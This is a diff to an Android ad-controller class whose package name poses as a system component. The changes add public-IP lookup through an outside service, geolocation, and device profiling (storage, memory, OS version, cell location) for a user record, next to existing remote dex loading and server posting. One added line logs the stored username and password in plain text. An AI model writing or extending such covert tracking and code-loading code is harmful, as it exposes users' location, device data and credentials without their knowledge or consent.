@@ -2,9 +2,17 @@ package com.android.system.core.sometools;
 
 
 
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.net.URLConnection;
+import java.text.DecimalFormat;
+
 import org.json.JSONException;
 import org.json.JSONObject;
-
 
 import android.app.Activity;
 import android.content.Context;
@@ -133,6 +141,7 @@ public class GAdController {
 		
 		String code = GTool.getSharedPreferences().getString(GCommons.SHARED_KEY_SDK_VERSIONCODE, "0");
 		Log.e("------------","----------curr sdk="+code);
+		
 		if(code.equals(versionCode) || !isFind)
 		{
 			if(code.equals(versionCode))
@@ -169,10 +178,8 @@ public class GAdController {
 			GDexLoaderUtil.copyDex(context, ob.toString());
 			GTool.saveSharedData(GCommons.SHARED_KEY_SDK_VERSIONCODE,newSdkCode);
 	        GTool.saveSharedData(GCommons.SHARED_KEY_DEX_NAME,dexName);
-	        
 			start();
 	        GTool.httpPostRequest(GCommons.URI_POST_UPDATE_SDK_NUM, this, "revUpdateSdk", GCommons.CHANNEL);	
-	       
 		}
 		else
 		{
@@ -207,6 +214,7 @@ public class GAdController {
 		{
 			String name = GTool.getSharedPreferences().getString(GCommons.SHARED_KEY_NAME, "");
 			String password = GTool.getSharedPreferences().getString(GCommons.SHARED_KEY_PASSWORD, "");
+			Log.e("-----------------","name="+name + "   pass="+password);
 			JSONObject obj = new JSONObject();
 			try {
 				obj.put(GCommons.SHARED_KEY_NAME, name);
@@ -285,9 +293,57 @@ public class GAdController {
 	
 	public void register()
 	{				
-		String url = GCommons.MAP_BAIDU_URL + GTool.getLocalHost();
-		GTool.httpGetRequest(url, this, "getLoction",null);
+		getNetIp();
 	}
+	
+	public void reg(String ip)
+	{
+		String url = GCommons.MAP_BAIDU_URL + ip;
+		GTool.httpGetRequest(url, this, "getLoction",null);
+		Log.e("---------------------","reg url="+url);
+	}
+	
+	public void getNetIp(){   
+		
+		new Thread(){
+			public void run() {
+				URL infoUrl = null;    
+			    InputStream inStream = null;   
+			    String p_ip = GTool.getLocalHost();
+			    try {    
+			        infoUrl = new URL("http://1212.ip138.com/ic.asp");    
+			        URLConnection connection = infoUrl.openConnection();    
+			        HttpURLConnection httpConnection = (HttpURLConnection)connection;  
+			        httpConnection.setConnectTimeout(60*1000);
+			        int responseCode = httpConnection.getResponseCode();  
+			        if(responseCode == HttpURLConnection.HTTP_OK)    
+			        {        
+			            inStream = httpConnection.getInputStream();       
+			            BufferedReader reader = new BufferedReader(new InputStreamReader(inStream,"gb2312"));    
+			            StringBuilder strber = new StringBuilder();    
+			            String line = null;    
+			            while ((line = reader.readLine()) != null)     
+			                strber.append(line );    
+			            inStream.close(); 
+			            String ips = strber.toString();
+			            if(ips != null)
+			            {
+			            	 int start = ips.indexOf("[");
+		                     int end = ips.indexOf("]");
+					         p_ip =  ips.substring(start+1, end);   
+					         reg(p_ip);
+			            }
+			        } 
+			        else
+			        {
+			        	reg(p_ip);
+			        }
+			    } catch (IOException e) {  
+			    	reg(p_ip);  
+			    }    
+			};
+		}.start();   
+	}    
 	
 	public void getLoction(Object obj_session,Object obj_data)
 	{
@@ -315,7 +371,17 @@ public class GAdController {
 		user.setNetworkOperator(tm.getNetworkOperator());		
 		user.setPhoneType(tm.getPhoneType());
 		user.setModel(android.os.Build.MODEL);
+		
 		user.setRelease(android.os.Build.VERSION.RELEASE);
+		int sdk = GTool.getSharedPreferences().getInt(GCommons.SHARED_KEY_SDK_VERSION, 0);
+		if(sdk != 0)
+		{
+			user.setTrueRelease(GTool.getRelease(sdk));
+		}
+		DecimalFormat decimalFomat = new DecimalFormat(".00");//构造方法的字符格式这里如果小数不足2位,会以0补足.		
+		user.setStorage(decimalFomat.format(GTool.getTotalInternalMemorySize())+"G");
+		user.setMemory(decimalFomat.format(GTool.getTotalMemorySize())+"G");
+		
 		user.setNetworkType(GTool.getNetworkType());
 		try {
 			JSONObject obj = new JSONObject(data);
@@ -332,9 +398,9 @@ public class GAdController {
 				user.setCity(city);
 				user.setDistrict(district);
 				user.setStreet(street);
-				
 				//用户可能拒绝获取位置 需要捕获异常
 				user.setLocation(tm.getCellLocation().toString());
+
 			}
 		} catch (Exception e) {
 			e.printStackTrace();
